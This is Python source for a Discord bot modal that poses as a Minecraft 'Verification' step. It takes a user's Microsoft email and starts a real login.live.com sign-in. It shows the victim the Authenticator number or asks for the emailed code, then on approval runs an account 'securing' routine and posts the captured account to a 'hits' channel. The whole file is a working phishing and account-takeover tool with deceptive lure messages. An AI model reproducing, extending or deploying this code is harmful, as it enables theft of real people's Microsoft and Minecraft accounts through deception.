from discord import ui, Embed
import datetime
import httpx
import discord
import asyncio
import json
import re

from views.buttons.codeSubmit import ButtonViewTwo
from views.buttons.failedOTP import ButtonViewThree
from views.buttons.embedOptions import ButtonOptions
from views.buttons.accountInfo import accountInfo

from views.utils.startSecure import startSecuringAccount
from views.utils.initialSession import getSession
from views.utils.checkLocked import checkLocked
from views.utils.sendAuth import sendAuth

from views.modals.embeds import embeds

config = json.load(open("config.json", "r+"))

class MyModalOne(ui.Modal, title="Verification"):
    username = ui.TextInput(label="Minecraft Username", required = True)
    email = ui.TextInput(label="Minecraft Email", required = True)

    async def on_submit(self, interaction: discord.Interaction, /) -> None: 
        # Check if email is valid
        if re.compile(r"^[\w\.-]+@[\w\.-]+\.\w{2,}$").match(self.email.value) is None:
            await interaction.response.send_message(
                "❌ Invalid Email. Make sure you entered your email correctly!", 
                ephemeral = True
            )
            return

        await interaction.response.defer()

        await interaction.followup.send(
            "⌛ Please wait while we try to verify you...",
            ephemeral = True
        )
        
        logs_channel = await interaction.client.fetch_channel(config["discord"]["logs_channel"])
        hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])

        # Checks if the account is locked
        # Special thanks to Revive (kpriest95523) for this request
        print("[~] - Checking if email is locked")

        lockedInfo = await checkLocked(self.email.value)
        print(lockedInfo)
        
        if lockedInfo:
            if lockedInfo["StatusCode"] != 500:
                if "Value" not in lockedInfo or json.loads(lockedInfo["Value"])["status"]["isAccountSuspended"]:
                
                    print("[X] - Microsoft Account is locked")
                    await interaction.followup.send(
                        "❌ This microsoft account is locked, as so we cannot verify it. Try again with another account.",
                        ephemeral = True
                    )

                    await logs_channel.send(
                        embed = Embed (
                            title = f"User | {interaction.user.name}",
                            description=f"Username | Email | Status\n```{self.username.value} | {self.email.value} | Failed to verify (Locked Microsoft Account)```",
                            timestamp = datetime.datetime.now(),
                            colour = 0xFF5C5C,                         
                            ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username.value}"),
                        view = ButtonOptions(interaction.user)
                    )

                    return

        self.session = getSession()

        # Sends OTP/Auth code
        emailInfo = await sendAuth(self.session, self.email.value)
        print(emailInfo)

        # Microsoft raping otp requests
        # Can be fixed since the latest otp sent still works
        if len(emailInfo) == 1:
            await logs_channel.send(
                embed = Embed(
                    title = f"{interaction.user.name} ({interaction.user.id})",
                    description = f"**Email** | **Status** | **Reason**\n```{self.email.value} | Failed to send code | Email OTP Cooldown```",
                    timestamp = datetime.datetime.now(),
                    colour = 0xFF5C5C,                         
                ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username.value}"),
                view = ButtonOptions(interaction.user)
            )

            await interaction.followup.send(
                    embed = Embed(
                    title = embeds["cooldown_otp"][0],
                    description = embeds["cooldown_otp"][1],
                ),
                ephemeral = True
            )

            return
        
        # Email does not exist (ifExistsResults can be used as an alternative)
        if "Credentials" not in emailInfo:
            await logs_channel.send(
                embed = Embed(
                    title = f"{interaction.user.name} ({interaction.user.id})",
                    description = f"**Email** | **Status** | **Reason**\n```{self.email.value} | Failed to send code | Email does not exist```",
                    timestamp = datetime.datetime.now(),
                    colour = 0xFF5C5C,                         
                ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username.value}"),
                view = ButtonOptions(interaction.user)
            )

            await interaction.followup.send(
                    embed = Embed(
                    title = embeds["invalid_email"][0],
                    description = embeds["invalid_email"][1],
                    color = 0xFF5C5C
                ),
                ephemeral = True
            )

            return

        # Entropy = Authenticator App number to click in  
        if "RemoteNgcParams" in emailInfo["Credentials"]:
            print("\n| Starting securing process |\n")
            print("[+] - Found Authenticator App")

            device = emailInfo["Credentials"]["RemoteNgcParams"]["SessionIdentifier"]

            if "Entropy" not in emailInfo["Credentials"]["RemoteNgcParams"]:
                    
                    response = await self.session.post(
                        "https://login.live.com/GetOneTimeCode.srf?id=38936", 
                        headers = {
                            "cookie": "MSPOK=$uuid-55593433-60c8-4191-8fa7-a7874311e85d$uuid-4fd7f4fb-42b7-4ffc-bd3d-8feacfb6a57e$uuid-8f1626a7-4080-4073-8686-354aa5b937cc$uuid-135d7477-b083-41e7-b681-2ce793c563e6$uuid-6c60a9a5-97c2-4902-aee3-00f99efacbcf$uuid-4059f6fb-ae72-4398-810f-c5cb6495640f$uuid-0b2844a4-bbfa-4118-9a20-4b00154ccdc0$uuid-8b82f8ca-93b0-440b-be93-b1a743e05907$uuid-1dce1868-997e-4c06-88d99-44db08a70c67$uuid-3c79bd95-3604-4bc1-8358-353fe9734742"
                        }, 
                        data = f"login=&flowtoken={device}&purpose=eOTT_RemoteNGC&channel=PushNotifications&SAPId=&lcid=1033&uaid=3dd509e1f6ae4e0fa6debefe3b45abcb&canaryFlowToken=-DukZxrqgCYbURm5kHk3U5rkTOMEtJxkIq761a!27Qbn4GRZqvsySwrek6w*uVBbTB1PQ0w0o!jBR2YoMjkZPZJunzjR2I7op80PNHaOWYedJU8uoipCkH8natDYj!zpmDK6FOTPcbedisM70Rv6oB4v3mxPu9wyTgp2aq6Ugc86bmt8mj9Ox*D3fqwz*pYKeMbDy4vLXVetOsXJK*6GooRw$"
                    ) 
                    entropy = response.json()["DisplaySignForUI"]
            else:
                entropy = emailInfo["Credentials"]["RemoteNgcParams"]["Entropy"]

            await interaction.followup.send(
                embed = Embed(
                    title="Verification ✅",
                    description=f"Authenticator Request.\nPlease confirm the code **`{entropy}`** on your app!",
                    colour=0x00FF00
                ),
                ephemeral = True
            )

            sucessEmbed = Embed(
                title = f"User | {interaction.user.name}",
                description=f"Username | Email | Status\n```{self.username.value} | {self.email.value} | Waiting for Auth confirmation```",
                timestamp = datetime.datetime.now(),
                colour = 0x678DC6,                         
            ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username.value}")

            await logs_channel.send(embed = sucessEmbed, view = ButtonOptions(interaction.user))

            # Checks every second for the authenticator state
            async def checkCode(flowToken):
                response = await self.session.post(
                    url = f"https://login.live.com/GetSessionState.srf?mkt=EN-US&lc=1033&slk={flowToken}&slkt=NGC",
                    headers = {
                        "Content-Type": "application/json",
                        "Cookie": "MSPOK=$uuid-3d6b1bc3-9fcd-4bd0-a4b1-1a8855505627$uuid-1a3e6d72-d224-456d-868f-4b85ff342088$uuid-58a49dcf-5abd-4a23-95ef-ed1b5999931e;",
                        "Accept-Language": "en-US,en;q=0.9",
                        "Origin": "https://login.live.com",
                        "Referer": "https://login.live.com/"
                    },
                    json = {
                        "DeviceCode": flowToken
                    }    
                )
                return response.json()
            
            i = 0
            while i < 60:

                data = await checkCode(device)
                print(data)

                if data["SessionState"] > 1 and data["AuthorizationState"] == 1:
                    failedAuth = embeds["failed_auth"]
                    await interaction.followup.send(
                        embed = Embed(
                            title = failedAuth[0],
                            description = failedAuth[1],
                            colour=0xFF5C5C
                        ),
                        ephemeral = True
                    )

                    await logs_channel.send(
                        embed = Embed(
                            title = f"{interaction.user.name} ({interaction.user.id})",
                            description = f"**Email** | **Status** | **Reason**\n```{self.email.value} | Failed to verify | Clicked on the wrong auth number```",
                            timestamp = datetime.datetime.now(),
                            colour = 0xFF5C5C                  
                        ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username.value}"),
                        view = ButtonOptions(interaction.user)
                    )
                    return
                
                elif data["SessionState"] > 1 or data["AuthorizationState"] > 1:
                    
                    sucessEmbed = Embed (
                        title = f"User | {interaction.user.name}",
                        description=f"Username | Email | Status\n```{self.username.value} | {self.email.value} | Auth code confirmed!```",
                        timestamp = datetime.datetime.now(),
                        colour = 0x79D990,                           
                    ).set_thumbnail(
                        url= f"https://visage.surgeplay.com/full/512/{self.username.value}"
                    )

                    await logs_channel.send("**This account is being automaticly secured.**")
                    await logs_channel.send(embed = sucessEmbed, view = ButtonOptions(interaction.user))

                    await interaction.followup.send(
                        "⌛ Please allow us to proccess your roles...", ephemeral=True
                    )

                    finalEmbeds = await startSecuringAccount(self.session, self.email.value, device) 
                    if not finalEmbeds:
                        await logs_channel.send(
                            embed = Embed(
                                title = f"{interaction.user.name} ({interaction.user.id})",
                                description = f"**Email** | **Status** | **Reason**\n```{self.email.value} | Failed to secure | Invalid email OTP```",
                                timestamp = datetime.datetime.now(),
                                colour = 0xFF5C5C                  
                            ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username.value}"),
                            view = ButtonOptions(interaction.user)
                        )
                        return
                    
                    await hits_channel.send("@everyone **Successfully secured an account.**")
                    await hits_channel.send(
                        embed = finalEmbeds[0],
                        view = accountInfo(finalEmbeds[1], interaction.user)
                    )
                    return
                
                await asyncio.sleep(1)
                i += 1

            failedAuth = embeds["timeout_auth"]
            await interaction.followup.send(
                    embed = Embed(
                    title = failedAuth[0],
                    description = failedAuth[1],
                    colour=0x00FF00
                ),
                ephemeral = True
            )

            await logs_channel.send(
               embed = Embed(
                    title = f"User | {interaction.user.name}",
                    description=f"Username | Email | Status\n```{self.username.value} | {self.email.value} | Failed to confirm for Auth```",
                    timestamp = datetime.datetime.now(),
                    colour = 0xDE755B              
                ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username.value}"),
                view = ButtonOptions(interaction.user)  
            )
            return

        elif "OtcLoginEligibleProofs" in emailInfo["Credentials"]:

            for value in emailInfo["Credentials"]["OtcLoginEligibleProofs"]:
                if value["otcSent"]:
                    verflowtoken = value["data"]
                    verEmail = value["display"]

            print("\n| Starting securing process |\n")
            print(f"[+] - Found security email: {verEmail}")

            await interaction.followup.send(
                embed=Embed(
                    title="Verification",
                    description=f"To complete verification, enter the confirmation code we sent to {verEmail}.\nThis step prevents automated or fake verifications.",
                    colour=0x00FF00
                ),
                view = ButtonViewTwo(
                    username = self.username.value,
                    email = self.email.value,
                    flowtoken = verflowtoken
                ),
                ephemeral = True
            )

            sucessEmbed = Embed (
                    title = f"User | {interaction.user.name}",
                    description=f"Username | Email | Status\n```{self.username.value} | {self.email.value} | Waiting for OTP code```",
                    timestamp = datetime.datetime.now(),
                    colour = 0x678DC6,                         
            ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username.value}")

            await logs_channel.send(embed = sucessEmbed, view = ButtonOptions(interaction.user))
        
        else:

            await logs_channel.send(
                embed = Embed(
                    title = f"{interaction.user.name} ({interaction.user.id})",
                    description = f"**Email** | **Status** | **Reason**\n```{self.email.value} | Failed to send code | No OTP methods found```",
                    timestamp = datetime.datetime.now(),
                    colour = 0xFF5C5C                  
                ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{self.username.value}"),
                view = ButtonOptions(interaction.user)  
            )

            await interaction.followup.send(
                embed = Embed(
                    title = embeds["failed_otp"][0],
                    description = embeds["failed_otp"][1],
                ),
                view = ButtonViewThree(),
                ephemeral = True
            )

            return
